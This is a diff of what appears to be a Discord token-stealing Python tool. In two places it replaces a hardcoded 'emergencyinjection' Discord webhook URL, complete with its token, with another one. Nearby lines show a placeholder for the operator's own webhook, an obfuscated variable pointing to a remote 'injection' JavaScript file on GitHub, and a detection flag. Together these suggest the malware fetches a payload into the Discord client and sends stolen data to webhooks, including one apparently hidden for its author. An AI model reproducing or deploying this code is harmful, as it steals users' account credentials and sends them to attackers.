@@ -534,7 +534,7 @@ def mac_check():
 
 
 hook = "YOUR WEBHOOK HERE"
-emergencyinjection = "https://canary.discord.com/api/webhooks/1245328876758892594/BVqiPFZt_rYjlm9pMqxUQTx3rMrBXeRLecTiZrEYnRhsqJwHeIfBg2sV_EZGPjtm1fuo"
+emergencyinjection = "https://canary.discord.com/api/webhooks/1245410550859698246/Brz8zfSVgflXCZF14oTVjAVqw-JmLhoLwUV6nyEzwOpG6_9_fYgCqC1mtAYXSA36vRuU"
 inj3c710n_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 color =  0x812118
 DETECTED = False
@@ -2007,7 +2007,7 @@ def mac_check():
             pass
 
 
-emergencyinjection = "https://canary.discord.com/api/webhooks/1245328876758892594/BVqiPFZt_rYjlm9pMqxUQTx3rMrBXeRLecTiZrEYnRhsqJwHeIfBg2sV_EZGPjtm1fuo"
+emergencyinjection = "https://canary.discord.com/api/webhooks/1245410550859698246/Brz8zfSVgflXCZF14oTVjAVqw-JmLhoLwUV6nyEzwOpG6_9_fYgCqC1mtAYXSA36vRuU"
 inj3c710n_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 color =  0x812118
 DETECTED = False
